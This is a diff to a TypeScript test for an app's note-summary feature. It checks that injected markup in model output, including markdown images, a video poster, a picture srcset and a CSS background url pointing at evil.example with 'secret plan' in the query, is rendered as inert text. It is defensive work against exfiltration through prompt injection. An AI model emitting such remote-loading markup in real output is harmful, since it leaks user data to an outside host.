@@ -3,7 +3,7 @@ import { parseNoteMarkdown } from '@/ui/workspace/folder-container/widgets/markd
 import { MAX_SUMMARY_IMAGES, SUMMARY_TEXT_LIMIT, add_summary_note, build_summary_messages, collect_summary_sources, coverage_line, summary_entries, summary_note_name, summary_position } from './summarize'
 import { image_to_data_url } from './imageInput'
 import type { SummaryEntry } from './summarize'
-import { strip_remote_images, strip_think } from './text'
+import { strip_think, untrusted_markdown } from './text'
 
 vi.mock('./imageInput', () => ({
 	image_to_data_url: vi.fn(async (_: unknown, id: string) => (
@@ -317,29 +317,37 @@ describe('add_summary_note', () => {
 		expect(ws.rename).toHaveBeenCalled()
 	})
 
-	test('an injected remote image is gone from the preview and from the saved note', async () => {
+	test('an injected remote image is text in the preview and in the saved note', async () => {
 		const raw = [
 			'<think>mention the secret plan</think>',
 			'# Summary',
 			'- secret plan',
 			'![](https://evil.example/?q=secret%20plan)',
 			'![photo](https://evil.example/a_(1).png "shot")',
-			'<img src="https://evil.example/x.png" alt="x">',
-			'<img src="https&#58;//evil.example/y.png">',
-			'<img src="&#104;&#116;&#116;&#112;&#115;&#58;//evil.example/z.png">',
-			'<img src="https://evil.example/open',
+			'<video poster="https://evil.example/?q=secret%20plan"></video>',
+			'<picture><source srcset="https://evil.example/s.png"></picture>',
+			'<p style="background:url(https://evil.example/b.png)">x</p>',
 		].join('\n')
-		// What the dialog renders. Without the strip, the preview would load the address.
-		expect(parseNoteMarkdown('![](https://evil.example/a.png)')).toContain('https://evil.example')
-		const summary = strip_remote_images(strip_think(raw))
+		// The same renderer the preview uses. Without the escape these are real tags.
+		const live = parseNoteMarkdown('<video poster="https://evil.example/a.png"></video><picture><source srcset="https://evil.example/s.png"></picture><p style="background:url(https://evil.example/b.png)">x</p>')
+		expect(live).toMatch(/<video\b/i)
+		expect(live).toMatch(/\sposter\s*=/i)
+		expect(live).toMatch(/<source\b/i)
+		expect(live).toMatch(/\sstyle\s*=/i)
+
+		const summary = untrusted_markdown(strip_think(raw))
 		const summary_html = parseNoteMarkdown(summary)
-		expect(summary_html).not.toContain('https://')
-		expect(summary_html).not.toContain('evil.example')
-		expect(summary).not.toContain('https://')
-		expect(summary).not.toContain('evil.example')
-		expect(summary).toContain('secret plan')
-		expect(summary).toContain('photo')
+		// The tag is text. marked may autolink the bare address; that still loads only on a click.
+		expect(summary_html).not.toMatch(/<(video|audio|source|picture|img|object|embed|iframe)\b/i)
+		expect(summary_html).not.toMatch(/<[a-z][^>]*\s(?:poster|srcset|style)\s*=/i)
+		expect(summary_html).toContain('poster')
+		expect(summary_html).toContain('srcset')
+		expect(summary_html).toContain('background')
+		expect(summary_html).toContain('secret plan')
+		expect(summary_html).toContain('photo')
+		expect(summary).not.toContain('](https://evil.example')
 		expect(summary).not.toContain('<think')
+		expect(summary).not.toContain('<video')
 
 		const save = vi.fn(async () => {})
 		await add_summary_note({
